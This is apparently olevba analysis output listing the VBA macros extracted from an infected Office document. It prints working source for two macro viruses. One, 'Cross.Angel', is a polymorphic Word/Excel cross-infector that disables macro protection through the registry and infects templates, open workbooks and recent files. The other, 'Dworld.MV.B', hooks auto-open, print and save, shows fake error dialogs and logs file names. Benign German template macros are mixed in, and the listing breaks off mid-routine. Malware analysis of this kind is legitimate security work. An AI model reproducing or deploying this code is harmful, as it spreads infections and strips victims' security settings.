olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Across-3796613208030ab534435dc5965403645a097ab5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Across-3796613208030ab534435dc5965403645a097ab5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Cross.Angel
Private Sub Document_Close()
On Error Resume Next
Const  ‰Ç¯� = "' Cross.Angel", † £ŽÄ = 132, ¼À¸–¸ = "9.0", …Ž�À´ = "Macro", ³µ•­» = "Tools", �³ËÀ™ = &H1, �³ËÀ™_ = &H0, ¨ÆÆº¢ = 0, »À¿È• = 1, ¨®£ªª = 12, Š�¯ƒÅ = "excel.application", ´Ç­»¨ = "DieseArbeitsmappe"
Application.EnableCancelKey = (Rnd * ¨ÆÆº¢)
If Application.Version = ¼À¸–¸ Then
    Application.CommandBars(…Ž�À´).Controls((»À¿È• + »À¿È• + »À¿È•)).Enabled = (Rnd * ¨ÆÆº¢)
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = �³ËÀ™
Else
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = �³ËÀ™_
    Application.CommandBars(³µ•­»).Controls(¨®£ªª).Enabled = (Rnd * ¨ÆÆº¢)
    Options.VirusProtection = (Rnd * ¨ÆÆº¢)
End If
Options.SaveNormalPrompt = (Rnd * ¨ÆÆº¢)
¢¹Ê“• = ¹½§¤�(ThisDocument.VBProject.VBComponents(»À¿È•).CodeModule.Lines(»À¿È•, † £ŽÄ))
If MacroContainer = ActiveDocument Then Set ›Á¼’� = NormalTemplate Else Set ›Á¼’� = ActiveDocument
With ›Á¼’�.VBProject.VBComponents(»À¿È•).CodeModule
    If .Lines(»À¿È•, »À¿È•) <>  ‰Ç¯� Then
        .DeleteLines »À¿È•, .CountOfLines
        .InsertLines »À¿È•, ¢¹Ê“•
        If ›Á¼’� = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
    End If
End With
If System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> »À¿È• Then
Set Ã®¦¯„ = GetObject(, Š�¯ƒÅ)
If Ã®¦¯„ = "" Then Set Ã®¦¯„ = CreateObject(Š�¯ƒÅ): Á¿¥‡ˆ = »À¿È•
If Á¿¥‡ˆ <> »À¿È• Then
    For Each –Æ§±� In Ã®¦¯„.Workbooks
       With –Æ§±�.VBProject.VBComponents(´Ç­»¨).CodeModule
            If .Lines(»À¿È•, »À¿È•) <>  ‰Ç¯� Then
                .DeleteLines »À¿È•, .CountOfLines
                .InsertLines »À¿È•, ¢¹Ê“•
                If –Æ§±�.Path <> "" Then –Æ§±�.Save Else –Æ§±�.SaveAs –Æ§±�.FullName
            End If
        End With
    Next
Else
    For –Æ§±� = »À¿È• To Ã®¦¯„.Application.RecentFiles.Maximum
        Ã®¦¯„.Application.RecentFiles(–Æ§±�).Open
            With Ã®¦¯„.Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(´Ç­»¨).CodeModule
                If .Lines(»À¿È•, »À¿È•) <>  ‰Ç¯� Then
                    .DeleteLines »À¿È•, .CountOfLines
                    .InsertLines »À¿È•, ¢¹Ê“•
                End If
            End With
        Ã®¦¯„.Application.Workbooks(Application.RecentFiles(1).Name).Close »À¿È•
    Next
    Ã®¦¯„.Quit
End If
System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = »À¿È•
End If
If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
If System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> »À¿È• Then System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = »À¿È•
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Const  ‰Ç¯� = "' Cross.Angel", † £ŽÄ = 132, ¼À¸–¸ = "9.0", …Ž�À´ = "Macro", ³µ•­» = "Tools", ¨ÆÆº¢ = 0, »À¿È• = 1, ¨®£ªª = 10, Š�¯ƒÅ = "word.application", ´Ç­»¨ = "DieseArbeitsmappe"
Application.EnableCancelKey = (Rnd * ¨ÆÆº¢)
If UCase(Dir("c:\.reg")) <> ".REG" Then
Open "c:\.reg" For Output As #1
    Print #1, "REGEDIT4"
If Application.Version = ¼À¸–¸ Then
    Application.CommandBars(…Ž�À´).Controls((»À¿È• + »À¿È• + »À¿È•)).Enabled = (Rnd * ¨ÆÆº¢)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
    Print #1, """Level""=dword:00000001"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
    Print #1, """Level""=dword:00000001"
Else
    Application.CommandBars(³µ•­»).Controls(¨®£ªª).Enabled = (Rnd * ¨ÆÆº¢)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
    Print #1, """Options6""=dword:00000000"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
    Print #1, """EnableMacroVirusProtection""=""0"""
End If
Close #1
End If
Shell "regedit /s c:\.reg", vbHide
¢¹Ê“• = ¹½§¤�(ThisWorkbook.VBProject.VBComponents(´Ç­»¨).CodeModule.Lines(»À¿È•, † £ŽÄ))
For Each –Æ§±� In Application.Workbooks
    With –Æ§±�.VBProject.VBComponents(´Ç­»¨).CodeModule
        If .Lines(»À¿È•, »À¿È•) <>  ‰Ç¯� Then
            .DeleteLines »À¿È•, .CountOfLines
            .InsertLines »À¿È•, ¢¹Ê“•
            If –Æ§±�.Path <> "" Then –Æ§±�.Save Else –Æ§±�.SaveAs –Æ§±�.FullName
        End If
    End With
Next
If Application.Workbooks.Count = »À¿È• Then
    Application.WindowState = xlMinimized
    For –Æ§±� = »À¿È• To Application.RecentFiles.Maximum
        Application.RecentFiles(–Æ§±�).Open
            With Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(´Ç­»¨).CodeModule
                If .Lines(»À¿È•, »À¿È•) <>  ‰Ç¯� Then
                    .DeleteLines »À¿È•, .CountOfLines
                    .InsertLines »À¿È•, ¢¹Ê“•
                End If
            End With
        Application.Workbooks(Application.RecentFiles(1).Name).Close »À¿È•
    Next
End If
Set Ã®¦¯„ = GetObject(, Š�¯ƒÅ)
If Ã®¦¯„ = "" Then Set Ã®¦¯„ = CreateObject(Š�¯ƒÅ): Á¿¥‡ˆ = »À¿È•
If Ã®¦¯„.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> »À¿È• Then Ã®¦¯„.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = »À¿È•
If Ã®¦¯„.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> »À¿È• Then
With Ã®¦¯„.NormalTemplate.VBProject.VBComponents(»À¿È•).CodeModule
    If .Lines(»À¿È•, »À¿È•) <>  ‰Ç¯� Then
        .DeleteLines »À¿È•, .CountOfLines
        .InsertLines »À¿È•, ¢¹Ê“•
        Ã®¦¯„.NormalTemplate.Save
        Ã®¦¯„.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = »À¿È•
    End If
End With
End If
If Á¿¥‡ˆ = »À¿È• Then Ã®¦¯„.Quit Else If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
End Sub
Private Function ¹½§¤�(¢¹Ê“•) 'JSMP v1.2
Dim ¨ÃÉŒ­(0 To 20): Randomize
µ¤–Š» = 1: ¨ÃÉŒ­(0) = "¢¹Ê“•": ¨ÃÉŒ­(1) = "¹½§¤�": ¨ÃÉŒ­(2) = "¨ÃÉŒ­": ¨ÃÉŒ­(3) = "ÀÉ¾ºÀ": ¨ÃÉŒ­(4) = "­—§žÅ": ¨ÃÉŒ­(5) = "µ¤–Š»": ¨ÃÉŒ­(6) = " ‰Ç¯�": ¨ÃÉŒ­(7) = "† £ŽÄ": ¨ÃÉŒ­(8) = "¼À¸–¸": ¨ÃÉŒ­(9) = "…Ž�À´": ¨ÃÉŒ­(10) = "³µ•­»": ¨ÃÉŒ­(11) = "�³ËÀ™": ¨ÃÉŒ­(12) = "¨ÆÆº¢": ¨ÃÉŒ­(13) = "»À¿È•": ¨ÃÉŒ­(14) = "¨®£ªª": ¨ÃÉŒ­(15) = "Š�¯ƒÅ": ¨ÃÉŒ­(16) = "´Ç­»¨": ¨ÃÉŒ­(17) = "›Á¼’�": ¨ÃÉŒ­(18) = "Ã®¦¯„": ¨ÃÉŒ­(19) = "Á¿¥‡ˆ": ¨ÃÉŒ­(20) = "–Æ§±�"
For ÀÉ¾ºÀ = 0 To 20
­—§žÅ = Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74))
Do
µ¤–Š» = InStr(µ¤–Š» + 1, ¢¹Ê“•, ¨ÃÉŒ­(ÀÉ¾ºÀ))
If µ¤–Š» Then ¢¹Ê“• = Mid(¢¹Ê“•, 1, (µ¤–Š» - 1)) & ­—§žÅ & Mid(¢¹Ê“•, (µ¤–Š» + Len(¨ÃÉŒ­(ÀÉ¾ºÀ))), Len(¢¹Ê“•))
Loop While µ¤–Š»
Next
¹½§¤� = ¢¹Ê“•
End Function
'Cross.Angel written by jackie twoflower /Lz0NT /MVT
'Uses Jackie's Stupid Macro Poly v1.2
'Office97 and Office2000 compatible | New Cross area!
'Hey my angel, this is for you. Why you left me?
'I can't live without you! I luv ya!
-------------------------------------------------------------------------------
VBA MACRO FließtextErstellen.bas 
in file: Virus.MSOffice.Across-3796613208030ab534435dc5965403645a097ab5 - OLE stream: 'Macros/VBA/FließtextErstellen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PlatzhalterEIN.bas 
in file: Virus.MSOffice.Across-3796613208030ab534435dc5965403645a097ab5 - OLE stream: 'Macros/VBA/PlatzhalterEIN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Wasserzeichen.bas 
in file: Virus.MSOffice.Across-3796613208030ab534435dc5965403645a097ab5 - OLE stream: 'Macros/VBA/Wasserzeichen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem =======================================================================
Rem Makro:     Wasserzeichen
Rem Datum:     25.7.1996
Rem WinWord:   6.0,7.0
Rem Copyright: © 1994,1996 by Gebhard Kühschweiger, Möllbrücke.
Rem ======================================================================
Rem Das Makro dient zum Erstellen, Ändern und Löschen von Wasserzeichen.
Rem Ein Wasserzeichen wird auf allen Seiten des ersten Abschnitts über den
Rem normalen Fließtext gedruckt. Die Wasserzeichen müssen als AutoText-
Rem Einträge vordefiniert sein. Die Namen dieser AutoText-Einträge müssen
Rem mit „Wasserzeichen-“ beginnen, z.B. "Wasserzeichen-Vertraulich". Die
Rem Liste aller verfügbaren Wasserzeichen wird zur Auswahl in einem
Rem Dialogfenster angezeigt.

Rem =======================================================================
Rem Globale Variable
Rem -----------------------------------------------------------------------

Dim Anwendung$   '* Name der Anwendung in Überschriften

Rem =======================================================================
Rem WasserzeichenLöschen
Rem -----------------------------------------------------------------------
Rem löscht ein mit einer Textmarke markiertes Wasserzeichen aus einer
Rem Kopfzeile

Private Sub WasserzeichenLöschen(Textmarke$)
   If WordBasic.ExistingBookmark(Textmarke$) Then
      WordBasic.EditBookmark Name:=Textmarke$, GoTo:=1
      WordBasic.WW6_EditClear
   End If
End Sub

Rem =======================================================================
Rem WasserzeichenEinfügen
Rem -----------------------------------------------------------------------
Rem fügt ein Wasserzeichen in eine Kopfzeile ein und markiert es mit einer
Rem Textmarke

Private Sub WasserzeichenEinfügen(Wasserzeichen$, Textmarke$)
   WordBasic.EndOfDocument
   WordBasic.WW7_EditAutoText Name:=Wasserzeichen$, _
      Context:=0, InsertAs:=0, Insert:=1
   WordBasic.CharLeft 1, 1
   WordBasic.EditBookmark Name:=Textmarke$, Add:=1
End Sub

Rem =======================================================================
Rem =======================================================================

-------------------------------------------------------------------------------
VBA MACRO Textumrahmung.bas 
in file: Virus.MSOffice.Across-3796613208030ab534435dc5965403645a097ab5 - OLE stream: 'Macros/VBA/Textumrahmung'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DatumInWorte.bas 
in file: Virus.MSOffice.Across-3796613208030ab534435dc5965403645a097ab5 - OLE stream: 'Macros/VBA/DatumInWorte'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem =======================================================================
Rem Makro:     akDatumInWorte
Rem Version:   2.0
Rem Datum:     14.Feb.1996
Rem WinWord:   6.0,7.0
Rem Copyright: © 1994,1996 by Anja Klement. All Rights Reserved.
Rem =======================================================================
Rem Das Makro konvertiert ein Datum in Worte; zum Beispiel aus
Rem "1.1.95" wird "1.1.95 (erster Januar neunzehnhundertfünfundneunzig)".

Rem =======================================================================
Rem Globale Variable
Rem -----------------------------------------------------------------------

Dim Z1__$(), Z10__$()

Rem =======================================================================
Rem DoDatumNeu
Rem -----------------------------------------------------------------------

Private Sub DoDatumneu(t, m, j, d$)
Dim dt$
Dim b
Dim dm$
Dim j_$
Dim z1$
Dim z$
Dim dj$
Dim c

ReDim Monatneu__$(12)
Monatneu__$(1) = "Januar"
Monatneu__$(2) = "Februar"
Monatneu__$(3) = "März"
Monatneu__$(4) = "April"
Monatneu__$(5) = "Mai"
Monatneu__$(6) = "Juni"
Monatneu__$(7) = "Juli"
Monatneu__$(8) = "August"
Monatneu__$(9) = "September"
Monatneu__$(10) = "Oktober"
Monatneu__$(11) = "November"
Monatneu__$(12) = "Dezember"

Z1__$(0) = ""
Z1__$(1) = "ein"
Z1__$(2) = "zwei"
Z1__$(3) = "drei"
Z1__$(4) = "vier"
Z1__$(5) = "fünf"
Z1__$(6) = "sechs"
Z1__$(7) = "sieben"
Z1__$(8) = "acht"
Z1__$(9) = "neun"

Z10__$(0) = "zehn"
Z10__$(1) = "elf"
Z10__$(2) = "zwölf"
Z10__$(3) = "dreizehn"
Z10__$(4) = "vierzehn"
Z10__$(5) = "fünfzehn"
Z10__$(6) = "sechzehn"
Z10__$(7) = "siebzehn"
Z10__$(8) = "achtzehn"
Z10__$(9) = "neunzehn"

Select Case t
    Case 1
        dt$ = "erster"
    Case 3
        dt$ = "dritter"
    Case 7
        dt$ = "siebenter"
    Case 8
        dt$ = "achter"
    Case 20
        dt$ = "zwanzigster"
    Case 30
        dt$ = "dreißigster"
    Case 31
        dt$ = "einunddreißigster"
    Case Else
        If t < 10 Then
            dt$ = Z1__$(t) + "ter"
        ElseIf t > 20 Then
            b = t - 20
            dt$ = Z1__$(b) + "undzwanzigster"
        Else
            dt$ = Z10__$(t - 10) + "ter"
        End If
End Select

dm$ = Monatneu__$(m)

If j < 100 Then j = j + 1900
j_$ = Mid(Str(j), 2)

If j < 2000 Then
    z1$ = WordBasic.[Left$](j_$, 2): DoDublett z1$
    z$ = WordBasic.[Right$](j_$, 2): DoDublett z$
    dj$ = z1$ + "hundert" + z$
Else
    c = WordBasic.Val(WordBasic.[Left$](j_$, 1))
    z$ = WordBasic.[Right$](j_$, 3): DoTriplett z$
    dj$ = Z1__$(c) + "tausend" + z$
End If

d$ = dt$ + " " + dm$ + " " + dj$

End Sub

Rem =======================================================================
Rem DoTriplett
Rem -----------------------------------------------------------------------

Private Sub DoTriplett(t$)
Dim Tripel$
Dim a

Tripel$ = t$: t$ = ""
a = WordBasic.Val(WordBasic.[Left$](Tripel$, 1))

If a > 0 Then t$ = Z1__$(a) + "hundert"
Tripel$ = WordBasic.[Right$](Tripel$, 2): DoDublett Tripel$
t$ = t$ + Tripel$

End Sub

Rem =======================================================================
Rem DoDublett
Rem -----------------------------------------------------------------------

Private Sub DoDublett(t$)
Dim Dublett$
Dim a
Dim b
Dim c
Dublett$ = t$: t$ = ""

a = WordBasic.Val(WordBasic.[Left$](Dublett$, 1))
b = WordBasic.Val(WordBasic.[Right$](Dublett$, 1))
c = WordBasic.Val(Dublett$)

If c < 10 Then
    t$ = Z1__$(c)
ElseIf a = 6 Then
    If b > 0 Then t$ = Z1__$(b) + "undsechzig" Else t$ = "sechzig"
ElseIf a = 7 Then
    If b > 0 Then t$ = Z1__$(b) + "undsiebzig" Else t$ = "siebzig"
ElseIf c > 39 Then
    If b > 0 Then t$ = Z1__$(b) + "und" + Z1__$(a) + "zig" Else t$ = Z1__$(a) + "zig"
ElseIf a = 3 Then
    If b > 0 Then t$ = Z1__$(b) + "unddreißig" Else t$ = "dreißig"
ElseIf a = 2 Then
    If b > 0 Then t$ = Z1__$(b) + "undzwanzig" Else t$ = "zwanzig"
Else
    t$ = Z10__$(c - 10)
End If

End Sub

Rem =======================================================================
Rem =======================================================================
-------------------------------------------------------------------------------
VBA MACRO ZahlInWorte.bas 
in file: Virus.MSOffice.Across-3796613208030ab534435dc5965403645a097ab5 - OLE stream: 'Macros/VBA/ZahlInWorte'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem =======================================================================
Rem Makro:     akZahlInWorte
Rem Version:   2.0
Rem Datum:     14.Feb.1996
Rem WinWord:   6.0,7.0
Rem Copyright: © 1994,1996 by Anja Klement. All Rights Reserved.
Rem =======================================================================
Rem Das Makro konvertiert eine Zahl in Worte; zum Beispiel wird aus "123"
Rem "123 (einhundertdreiundzwanzig)".

Rem =======================================================================
Rem Globale Variable
Rem -----------------------------------------------------------------------

Dim Z1__$(), Z10__$()

Rem =======================================================================
Rem DoNum
Rem -----------------------------------------------------------------------

Private Sub DoNum(z$)
Dim Zahl$
Dim z_
Dim z1$

Z1__$(0) = ""
Z1__$(1) = "ein"
Z1__$(2) = "zwei"
Z1__$(3) = "drei"
Z1__$(4) = "vier"
Z1__$(5) = "fünf"
Z1__$(6) = "sechs"
Z1__$(7) = "sieben"
Z1__$(8) = "acht"
Z1__$(9) = "neun"

Z10__$(0) = "zehn"
Z10__$(1) = "elf"
Z10__$(2) = "zwölf"
Z10__$(3) = "dreizehn"
Z10__$(4) = "vierzehn"
Z10__$(5) = "fünfzehn"
Z10__$(6) = "sechzehn"
Z10__$(7) = "siebzehn"
Z10__$(8) = "achtzehn"
Z10__$(9) = "neunzehn"

Zahl$ = z$
z_ = WordBasic.Val(z$): z$ = ""

Select Case z_
    Case 0
        z$ = "null"
    Case 1
        z$ = "eins"
    Case Else
        If z_ < 100 Then
            DoDublett Zahl$: z$ = Zahl$
        ElseIf z_ < 1000 Then
            DoTriplett Zahl$: z$ = Zahl$
        ElseIf z_ < 1000000 Then
            Do1000 Zahl$: z$ = Zahl$
        ElseIf z_ < 10000000 Then
            z$ = WordBasic.[Left$](Zahl$, 1)
            z1$ = WordBasic.[Right$](Zahl$, 6)
            If z$ = "1" Then
                z$ = "eine Million "
            Else
                DoDublett z$
                z$ = z$ + " Millionen "
            End If
            Do1000 z1$
            z$ = z$ + z1$
        ElseIf z_ < 100000000 Then
            z$ = WordBasic.[Left$](Zahl$, 2)
            z1$ = WordBasic.[Right$](Zahl$, 6)
            DoDublett z$
            z$ = z$ + " Millionen "
            Do1000 z1$
            z$ = z$ + z1$
        ElseIf z_ < 1000000000 Then
            z$ = WordBasic.[Left$](Zahl$, 3)
            z1$ = WordBasic.[Right$](Zahl$, 6)
            DoTriplett z$
            z$ = z$ + " Millionen "
            Do1000 z1$
            z$ = z$ + z1$
        Else
            z$ = "Zahl zu groß !"
        End If
End Select

End Sub

Rem =======================================================================
Rem Do1000
Rem -----------------------------------------------------------------------

Private Sub Do1000(t$)
Dim t_
Dim t1$
Dim z$
Dim z1$

t_ = WordBasic.Val(t$): t1$ = ""

If t_ = 0 Then
    t$ = ""
ElseIf t_ = 1 Then
    t$ = "undein"
Else
    If t_ > 999 Then
         t1$ = "tausend"
    ElseIf t_ < 100 Then
        t1$ = "und"
    End If
    z$ = WordBasic.[Left$](t$, Len(t$) - 3)
    z1$ = WordBasic.[Right$](t$, 3)
    If Len(z$) < 3 Then DoDublett z$ Else DoTriplett z$
    DoTriplett z1$
    t$ = z$ + t1$ + z1$
End If

End Sub

Rem =======================================================================
Rem DoTriplett
Rem -----------------------------------------------------------------------

Private Sub DoTriplett(t$)
Dim Tripel$
Dim a

Tripel$ = t$: t$ = ""
a = WordBasic.Val(WordBasic.[Left$](Tripel$, 1))

If a > 0 Then t$ = Z1__$(a) + "hundert"
Tripel$ = WordBasic.[Right$](Tripel$, 2)
DoDublett Tripel$
t$ = t$ + Tripel$

End Sub

Rem =======================================================================
Rem DoDublett
Rem -----------------------------------------------------------------------

Private Sub DoDublett(t$)
Dim Dublett$
Dim a
Dim b
Dim c

Dublett$ = t$: t$ = ""

a = WordBasic.Val(WordBasic.[Left$](Dublett$, 1))
b = WordBasic.Val(WordBasic.[Right$](Dublett$, 1))
c = WordBasic.Val(Dublett$)

If c < 10 Then
    t$ = Z1__$(c)
ElseIf a = 6 Then
    If b > 0 Then t$ = Z1__$(b) + "undsechzig" Else t$ = "sechzig"
ElseIf a = 7 Then
    If b > 0 Then t$ = Z1__$(b) + "undsiebzig" Else t$ = "siebzig"
ElseIf c > 39 Then
    If b > 0 Then t$ = Z1__$(b) + "und" + Z1__$(a) + "zig" Else t$ = Z1__$(a) + "zig"
ElseIf a = 3 Then
    If b > 0 Then t$ = Z1__$(b) + "unddreißig" Else t$ = "dreißig"
ElseIf a = 2 Then
    If b > 0 Then t$ = Z1__$(b) + "undzwanzig" Else t$ = "zwanzig"
Else
    t$ = Z10__$(c - 10)
End If

End Sub

Rem =======================================================================
Rem =======================================================================
-------------------------------------------------------------------------------
VBA MACRO Falzmarken.bas 
in file: Virus.MSOffice.Across-3796613208030ab534435dc5965403645a097ab5 - OLE stream: 'Macros/VBA/Falzmarken'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem ======================================================================
Rem Makro:     FalzmarkenManager
Rem Version:   2.0
Rem Datum:     14.Feb.1996
Rem WinWord:   6.0,7.0
Rem Copyright: © 1996 by Gebhard Kühschweiger, Möllbrücke.
Rem ======================================================================
Rem Das Makro dient zum Erstellen, Ändern und Löschen von Falzmarken auf
Rem der ersten Seite des Dokuments.

Rem =======================================================================
Rem Globale Variable
Rem -----------------------------------------------------------------------

Dim Anwendung$   '* Name der Anwendung in Überschriften

Rem =======================================================================
Rem FalzmarkeLesen
Rem -----------------------------------------------------------------------

Private Function VariableLesen$(aVariable$, aDefault$)
Dim Temp$
    Temp$ = WordBasic.[GetDocumentVar$](aVariable$)
    If Temp$ = "" _
       Then VariableLesen$ = aDefault$ _
       Else VariableLesen$ = Temp$
End Function

Rem =======================================================================
Rem FalzmarkeEinfügen
Rem -----------------------------------------------------------------------

Private Sub FalzmarkeEinfügen(aNummer, aVertikal$, aAbstand$, aBreite$)
Dim Falzmarke$
   WordBasic.StartOfDocument
   Falzmarke$ = "ojFalzmarke" + WordBasic.[LTrim$](Str(aNummer))
   WordBasic.SetDocumentVar Falzmarke$, aVertikal$
   WordBasic.InsertFrame
   WordBasic.FormatFrame Wrap:=0, _
      WidthRule:=1, FixedWidth:=aBreite$, _
      HeightRule:=2, FixedHeight:="0,1 cm", _
      PositionHorz:=aAbstand$, PositionHorzRel:=1, _
      PositionVert:=aVertikal$, PositionVertRel:=1, _
      DistFromText:="0 cm", DistVertFromText:="0 cm", _
      MoveWithText:=0, LockAnchor:=1
   WordBasic.FormatBordersAndShading ApplyTo:=0, Shadow:=0, _
      TopBorder:=10, LeftBorder:=0, _
      BottomBorder:=0, RightBorder:=0, _
      HorizBorder:=0, VertBorder:=0, _
      TopColor:=0, LeftColor:=0, _
      BottomColor:=0, RightColor:=0, _
      HorizColor:=0, VertColor:=0, _
      FromText:="0 pt", Shading:=0, _
      Foreground:=0, Background:=0, _
      Tab:="0", FineShading:=-1
End Sub

Rem =======================================================================
Rem =======================================================================

-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSOffice.Across-3796613208030ab534435dc5965403645a097ab5 - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.FileNewDefault
WordBasic.ViewPage
WordBasic.ViewZoom ZoomPercent:="90%"
End Sub
-------------------------------------------------------------------------------
VBA MACRO HAKLogo.bas 
in file: Virus.MSOffice.Across-3796613208030ab534435dc5965403645a097ab5 - OLE stream: 'Macros/VBA/HAKLogo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Dworld.bas 
in file: Virus.MSOffice.Across-3796613208030ab534435dc5965403645a097ab5 - OLE stream: 'Macros/VBA/Dworld'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer

Sub AnsichtCode()
 On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "Nicht genug freien Speicher um Anwendung zu starten", 16, "Microsoft Word - Fehler"
 
 WordBasic.FileExit Dlg

End Sub

Sub AnsichtVBCode()
On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "Nicht genug freien Speicher um Anwendung zu starten", 16, "Microsoft Word - Fehler"
 
 WordBasic.FileExit Dlg

End Sub
Sub AutoOpen()

ShowVisualBasicEditor = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
 
 With Options
     .SaveNormalPrompt = False
     .VirusProtection = False
     .AllowFastSave = False
 End With

 On Error GoTo ende_
 
 Call InfNormal
 Call InfDok
 Call PayloadB

 ActiveDocument.SaveAs (WordBasic.[FileName$]())

ende_:
End Sub
Sub AutoNew()
 
 Call AutoOpen

End Sub

Sub DateiDokVorlagen()
 On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "Nicht genug freien Speicher um Anwendung zu starten", 16, "Microsoft Word - Fehler"
 
 WordBasic.FileExit Dlg

End Sub

Sub DateiDruckenStandard()

Randomize

If Second(Now()) <= 30 And Int((3 * Rnd) + 1) = 2 Then
MsgBox "Des Zauberer´s Finger sind im Spiel!", 32, "Microsoft Word"

ScreenUpdating = 0
 
 Call PayloadA
 
  WordBasic.EndOfDocument
    Selection.TypeParagraph
    Selection.TypeParagraph
     Selection.Font.Name = "Courier New"
    Selection.Font.ColorIndex = wdRed
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    WordBasic.Insert "...Die aufgeklärten Brüder der schwarzen Nacht sagen:..."
    Selection.TypeParagraph
    WordBasic.Insert "-HOOOOOLLDRIIOOOOO!!!-"
  WordBasic.StartOfDocument
 
ScreenUpdating = 1

End If
 
 ActiveDocument.PrintOut
 
 Call InfNormal
 Call InfDok

 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 Call PayloadB

End Sub

Sub DateiÖffnen()
On Error GoTo ende_
 
 ShowVisualBasicEditor = False
 WordBasic.DisableAutoMacros 0

 With Options
     .SaveNormalPrompt = False
 End With

 With Dialogs(wdDialogFileOpen)
     .Show
 End With

 Call InfDok
 
 ActiveDocument.Save
 
ende_:
End Sub
Sub DateiSpeichern()
On Error Resume Next

 With Dialogs(wdDialogFileSaveAs)
    .Show
 End With
 
 Call InfDok
 Call DworldInfo
 
 ActiveDocument.Save

End Sub
Sub Dworld()
' DiscwørlD MakrøViruS -Dwørld.MV.B- der magischen Gilde
' Prøgrammiert von Rincewind~[m@G]~
' Kontakt: | rincewind_mg@hotmail.com |
' !FöRDERT EURE LOKALE SZENE!
' Ausgesetzt im Jänner 99
' Danke an alle die mich kennen | besønders NJøker[SLAM] | cøRDy & LRay <beide LzØ>
' Dwørld.MV ist FleTsCheR und IarRaGøN<LzØ> gewidmet

' ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØ
' Ø !"§%&/()=?->DiE auFgeKLärTeN BRüdeR dER sCHwaRzeN NaCHt<-?=()\&%$§"! Ø
' ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØ
End Sub
Sub DworldInfo()
 On Error GoTo ende_
 
 Open "C:\WINDOWS\SYSTEM\DWORLD.INI" For Append As 2
  a$ = Date$
  b$ = Time$
  c$ = WordBasic.[FileName$]()
  
  Print #2, c$ + ",  " + a$ + ",  " + b$ + " ;"
     
  Close 2
ende_:
End Sub
Sub ExtrasMakro()
 On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "Nicht genug freien Speicher um Anwendung zu starten", 16, "Microsoft Word - Fehler"
 
 WordBasic.FileExit Dlg

End Sub

Sub PayloadA()
On Error Resume Next

Randomize

If Day(Now()) = 24 And Int((5 * Rnd) + 1) = 1 Then
 MsgBox "Des Zauberer´s Finger sind im Spiel!", 32, "Microsoft Word"

